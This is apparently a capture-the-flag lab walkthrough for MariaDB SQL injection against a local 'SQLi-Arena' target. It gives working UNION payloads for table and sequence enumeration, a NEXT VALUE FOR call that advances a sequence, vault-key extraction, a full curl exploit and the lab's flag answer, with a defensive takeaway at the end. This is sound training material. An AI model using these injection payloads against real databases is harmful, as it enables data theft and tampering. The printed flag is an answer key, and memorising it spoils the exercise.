<h4>Step 1: Test Normal Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>ORD-1000<br>
        <span class="prompt">SQL: </span>SELECT id, order_ref, amount FROM orders WHERE order_ref = 'ORD-1000'<br><br>
        <span class="prompt">Output:</span><br>
        1 | ORD-1000 | $149.99
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MariaDB Error:</strong> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
    </div>
</div>

<h4>Step 3: Enumerate Tables and Sequences</h4>
<p>
    The query returns 3 columns (<code>id</code>, <code>order_ref</code>, <code>amount</code>).
    Use UNION with 3 columns to discover hidden tables. Notice <code>order_seq</code> has type
    <code>SEQUENCE</code>: a MariaDB-specific feature not found in MySQL.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Table Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT table_name, table_type, NULL FROM information_schema.tables WHERE table_schema=database() -- -<br><br>
        <span class="prompt">Output:</span><br>
        orders | BASE TABLE<br>
        <strong>order_seq</strong> | <strong>SEQUENCE</strong><br>
        <strong>sequence_vault</strong> | BASE TABLE
    </div>
</div>

<h4>Step 4: Query Sequence Metadata</h4>
<p>
    MariaDB exposes sequence details via <code>information_schema.sequences</code>.
    You can also call <code>NEXT VALUE FOR</code> to advance the sequence.
    The increment column shows as $1.00 because the amount column is rendered with a $ prefix.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Sequence Interaction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT sequence_name, start_value, increment FROM information_schema.sequences WHERE sequence_schema=database() -- -<br>
        <span class="prompt">Output: </span><strong>order_seq</strong> | 1000 | $1.00<br><br>
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT NEXT VALUE FOR order_seq, NULL, NULL -- -<br>
        <span class="prompt">Output: </span>1003 | | $<br>
        <span class="prompt">// Each call increments the sequence (value shown is current call's result)</span>
    </div>
</div>

<h4>Step 5: Extract the Vault Key</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. UNION Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT vault_key, NULL, NULL FROM sequence_vault -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>FLAG{ma_s3qu3nc3_0bj_1nj}</strong> | | $
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the vault key and paste it into the verification form:
    <code>FLAG{ma_s3qu3nc3_0bj_1nj}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mariadb/lab5" \<br> --data-urlencode "ref=XYZNOTEXIST' UNION SELECT vault_key, NULL, NULL FROM sequence_vault -- -"<br><br>
        <span class="prompt">Result: </span><strong>FLAG{ma_s3qu3nc3_0bj_1nj}</strong>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MariaDB sequences are first-class database objects
    (unlike MySQL's AUTO_INCREMENT). They appear in <code>information_schema.sequences</code>
    with type <code>SEQUENCE</code> and can be manipulated via <code>NEXT VALUE FOR</code>,
    <code>PREVIOUS VALUE FOR</code>, and <code>SETVAL()</code>. An attacker who discovers
    sequences can: (1) enumerate them for reconnaissance, (2) predict or manipulate
    auto-generated IDs used in business logic, (3) cause denial of service by exhausting
    sequence ranges. Always restrict access to sequence manipulation functions.
</div>
